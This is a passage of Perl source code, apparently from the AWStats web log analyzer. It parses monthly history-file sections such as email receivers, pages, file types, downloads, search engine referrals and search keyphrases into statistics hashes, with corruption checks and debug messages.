0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'emailreceiver'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_emailr_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t$_emailr_k{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( !$_emailr_l{ $field[0] } ) {\n\t\t\t\t\t\t\t\t$_emailr_l{ $field[0] } = int( $field[3] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_EMAILRECEIVER'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_EMAILRECEIVER\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_EMAILRECEIVER'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_EMAILRECEIVER\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section EMAILRECEIVER not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of EMAILRECEIVER section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'emailreceiver'};\n\t\t\t\tif ( $SectionsToSave{'emailreceiver'} ) {\n\t\t\t\t\tSave_History( 'emailreceiver', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'emailreceiver'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_emailr_h = ();\n\t\t\t\t\t\t%_emailr_k = ();\n\t\t\t\t\t\t%_emailr_l = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_SIDER\n\t\t\tif ( $field[0] eq 'BEGIN_SIDER' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of SIDER section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'sider'} ) {\n\t\t\t\t\t\t\tmy $loadrecord = 0;\n\t\t\t\t\t\t\tif ($withupdate) {\n\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif ( $HTMLOutput{'main'} ) {\n\t\t\t\t\t\t\t\t\tif ( $MonthRequired eq 'all' ) {\n\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\tif (\n\t\t\t\t\t\t\t\t\t\t\t$countloaded < $MaxNbOf{'PageShown'}\n\t\t\t\t\t\t\t\t\t\t\t&& $field[1] >= $MinHit{'File'} )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t$TotalDifferentPages++;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t{ # This is for $HTMLOutput = urldetail, urlentry or urlexit\n\t\t\t\t\t\t\t\t\tif ( $MonthRequired eq 'all' ) {\n\t\t\t\t\t\t\t\t\t\tif (\n\t\t\t\t\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t\t\t\t\t!$FilterIn{'url'}\n\t\t\t\t\t\t\t\t\t\t\t\t|| $field[0] =~\n\t\t\t\t\t\t\t\t\t\t\t\t/$FilterIn{'url'}/\n\t\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\t\t\t\t&& ( !$FilterEx{'url'}\n\t\t\t\t\t\t\t\t\t\t\t\t|| $field[0] !~\n\t\t\t\t\t\t\t\t\t\t\t\t/$FilterEx{'url'}/ )\n\t\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\tif (\n\t\t\t\t\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t\t\t\t\t!$FilterIn{'url'}\n\t\t\t\t\t\t\t\t\t\t\t\t|| $field[0] =~\n\t\t\t\t\t\t\t\t\t\t\t\t/$FilterIn{'url'}/\n\t\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\t\t\t\t&& ( !$FilterEx{'url'}\n\t\t\t\t\t\t\t\t\t\t\t\t|| $field[0] !~\n\t\t\t\t\t\t\t\t\t\t\t\t/$FilterEx{'url'}/ )\n\t\t\t\t\t\t\t\t\t\t\t&& $field[1] >= $MinHit{'File'}\n\t\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t$TotalDifferentPages++;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\n# Posssibilite de mettre if ($FilterIn{'url'} && $field[0] =~ /$FilterIn{'url'}/) mais il faut gerer TotalPages de la meme maniere\n\t\t\t\t\t\t\t\t$TotalBytesPages += ( $field[2] || 0 );\n\t\t\t\t\t\t\t\t$TotalEntries    += ( $field[3] || 0 );\n\t\t\t\t\t\t\t\t$TotalExits      += ( $field[4] || 0 );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ($loadrecord) {\n\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\t$_url_p{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t\t$_url_k{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t\t$_url_e{ $field[0] } += $field[3];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[4] ) {\n\t\t\t\t\t\t\t\t\t$_url_x{ $field[0] } += $field[4];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_SIDER'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_SIDER\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_SIDER'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_SIDER\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section SIDER not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of SIDER section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'sider'};\n\n# WE DO NOT SAVE SECTION NOW BECAUSE VALUES CAN BE CHANGED AFTER READING VISITOR\n#if ($SectionsToSave{'sider'}) {\n#\tSave_History('sider',$year,$month,$date); delete $SectionsToSave{'sider'};\n#\tif ($withpurge) { %_url_p=(); %_url_k=(); %_url_e=(); %_url_x=(); }\n#}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_FILETYPES\n\t\t\tif ( $field[0] eq 'BEGIN_FILETYPES' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of FILETYPES section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'filetypes'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_filetypes_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t$_filetypes_k{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t$_filetypes_gz_in{ $field[0] } += $field[3];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[4] ) {\n\t\t\t\t\t\t\t\t$_filetypes_gz_out{ $field[0] } += $field[4];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_FILETYPES'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_FILETYPES\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_FILETYPES'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_FILETYPES\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section FILETYPES not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of FILETYPES section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'filetypes'};\n\t\t\t\tif ( $SectionsToSave{'filetypes'} ) {\n\t\t\t\t\tSave_History( 'filetypes', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'filetypes'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_filetypes_h      = ();\n\t\t\t\t\t\t%_filetypes_k      = ();\n\t\t\t\t\t\t%_filetypes_gz_in  = ();\n\t\t\t\t\t\t%_filetypes_gz_out = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_DOWNLOADS\n\t\t\tif ( $field[0] eq 'BEGIN_DOWNLOADS' ) {\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\" Begin of DOWNLOADS section\");\n\t\t\t\t}\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $counttoload = int($field[1]);\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'downloads'}) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t$_downloads{$field[0]}->{'AWSTATS_HITS'} += int( $field[1] );\n\t\t\t\t\t\t\t$_downloads{$field[0]}->{'AWSTATS_206'} += int( $field[2] );\n\t\t\t\t\t\t\t$_downloads{$field[0]}->{'AWSTATS_SIZE'} += int( $field[3] );\t\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_DOWNLOADS'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_DOWNLOADS\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_DOWNLOADS'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_DOWNLOADS\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section DOWNLOADS not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of DOWNLOADS section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'downloads'};\n\t\t\t\tif ( $SectionsToSave{'downloads'} ) {\n\t\t\t\t\tSave_History( 'downloads',\n\t\t\t\t\t\t$year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'downloads'};\n\t\t\t\t\tif ($withpurge) { %_downloads = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_SEREFERRALS\n\t\t\tif ( $field[0] eq 'BEGIN_SEREFERRALS' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of SEREFERRALS section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'sereferrals'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $versionnum < 5004 )\n\t\t\t\t\t\t\t{    # For history files < 5.4\n\t\t\t\t\t\t\t\tmy $se = $field[0];\n\t\t\t\t\t\t\t\t$se =~ s/\\./\\\\./g;\n\t\t\t\t\t\t\t\tif ( $SearchEnginesHashID{$se} ) {\n\t\t\t\t\t\t\t\t\t$_se_referrals_h{ $SearchEnginesHashID{$se}\n\t\t\t\t\t\t\t\t\t  } += $field[1]\n\t\t\t\t\t\t\t\t\t  || 0;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t$_se_referrals_h{ $field[0] } += $field[1]\n\t\t\t\t\t\t\t\t\t  || 0;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telsif ( $versionnum < 5091 )\n\t\t\t\t\t\t\t{    # For history files < 5.91\n\t\t\t\t\t\t\t\tmy $se = $field[0];\n\t\t\t\t\t\t\t\t$se =~ s/\\./\\\\./g;\n\t\t\t\t\t\t\t\tif ( $SearchEnginesHashID{$se} ) {\n\t\t\t\t\t\t\t\t\t$_se_referrals_p{ $SearchEnginesHashID{$se}\n\t\t\t\t\t\t\t\t\t  } += $field[1]\n\t\t\t\t\t\t\t\t\t  || 0;\n\t\t\t\t\t\t\t\t\t$_se_referrals_h{ $SearchEnginesHashID{$se}\n\t\t\t\t\t\t\t\t\t  } += $field[2]\n\t\t\t\t\t\t\t\t\t  || 0;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t$_se_referrals_p{ $field[0] } += $field[1]\n\t\t\t\t\t\t\t\t\t  || 0;\n\t\t\t\t\t\t\t\t\t$_se_referrals_h{ $field[0] } += $field[2]\n\t\t\t\t\t\t\t\t\t  || 0;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\t$_se_referrals_p{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t\t$_se_referrals_h{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_SEREFERRALS'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_SEREFERRALS\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_SEREFERRALS'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_SEREFERRALS\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section SEREFERRALS not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of SEREFERRALS section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'sereferrals'};\n\t\t\t\tif ( $SectionsToSave{'sereferrals'} ) {\n\t\t\t\t\tSave_History( 'sereferrals', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'sereferrals'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_se_referrals_p = ();\n\t\t\t\t\t\t%_se_referrals_h = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_PAGEREFS\n\t\t\tif ( $field[0] eq 'BEGIN_PAGEREFS' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of PAGEREFS section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'pagerefs'} ) {\n\t\t\t\t\t\t\tmy $loadrecord = 0;\n\t\t\t\t\t\t\tif ($withupdate) {\n\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif (\n\t\t\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t\t\t!$FilterIn{'refererpages'}\n\t\t\t\t\t\t\t\t\t\t|| $field[0] =~\n\t\t\t\t\t\t\t\t\t\t/$FilterIn{'refererpages'}/\n\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\t\t&& ( !$FilterEx{'refererpages'}\n\t\t\t\t\t\t\t\t\t\t|| $field[0] !~\n\t\t\t\t\t\t\t\t\t\t/$FilterEx{'refererpages'}/ )\n\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ($loadrecord) {\n\t\t\t\t\t\t\t\tif ( $versionnum < 5004 )\n\t\t\t\t\t\t\t\t{    # For history files < 5.4\n\t\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\t\t$_pagesrefs_h{ $field[0] } +=\n\t\t\t\t\t\t\t\t\t\t  int( $field[1] );\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\t\t$_pagesrefs_p{ $field[0] } +=\n\t\t\t\t\t\t\t\t\t\t  int( $field[1] );\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t\t\t$_pagesrefs_h{ $field[0] } +=\n\t\t\t\t\t\t\t\t\t\t  int( $field[2] );\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_PAGEREFS'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_PAGEREFS\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_PAGEREFS'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_PAGEREFS\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section PAGEREFS not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of PAGEREFS section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'pagerefs'};\n\t\t\t\tif ( $SectionsToSave{'pagerefs'} ) {\n\t\t\t\t\tSave_History( 'pagerefs', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'pagerefs'};\n\t\t\t\t\tif ($withpurge) { %_pagesrefs_p = (); %_pagesrefs_h = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_SEARCHWORDS\n\t\t\tif ( $field[0] eq 'BEGIN_SEARCHWORDS' ) {\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" Begin of SEARCHWORDS section ($MaxNbOf{'KeyphrasesShown'},$MinHit{'Keyphrase'})\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'searchwords'} ) {\n\t\t\t\t\t\t\tmy $loadrecord = 0;\n\t\t\t\t\t\t\tif ($withupdate) {\n\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif ( $HTMLOutput{'main'} ) {\n\t\t\t\t\t\t\t\t\tif ( $MonthRequired eq 'all' ) {\n\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\tif ( $countloaded <\n\t\t\t\t\t\t\t\t\t\t\t   $MaxNbOf{'KeyphrasesShown'}\n\t\t\t\t\t\t\t\t\t\t\t&& $field[1] >=\n\t\t\t\t\t\t\t\t\t\t\t$MinHit{'Keyphrase'} )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t$TotalDifferentKeyphrases++;\n\t\t\t\t\t\t\t\t\t\t$TotalKeyphrases += ( $field[1] || 0 );\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telsif ( $HTMLOutput{'keyphrases'} )\n\t\t\t\t\t\t\t\t{    # Load keyphrases for keyphrases chart\n\t\t\t\t\t\t\t\t\tif ( $MonthRequired eq 'all' ) {\n\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\tif ( $field[1] >= $MinHit{'Keyphrase'} )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t$TotalDifferentKeyphrases++;\n\t\t\t\t\t\t\t\t\t\t$TotalKeyphrases += ( $field[1] || 0 );\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $HTMLOutput{'keywords'} )\n\t\t\t\t\t\t\t\t{    # Load keyphrases for keywords chart\n\t\t\t\t\t\t\t\t\t$loadrecord = 2;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ($loadrecord) {\n\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\tif ( $loadrecord == 2 ) {\n\t\t\t\t\t\t\t\t\t\tforeach ( split( /\\+/, $field[0] ) )\n\t\t\t\t\t\t\t\t\t\t{    # field[0] is \"val1+val2+...\"\n\t\t\t\t\t\t\t\t\t\t\t$_keywords{$_} += $field[1];\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\t$_keyphrases{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_SEARCHWORDS'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_SEARCHWORDS\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_SEARCHWORDS'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_SEARCHWORDS\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section SEARCHWORDS not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of SEARCHWORDS section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete 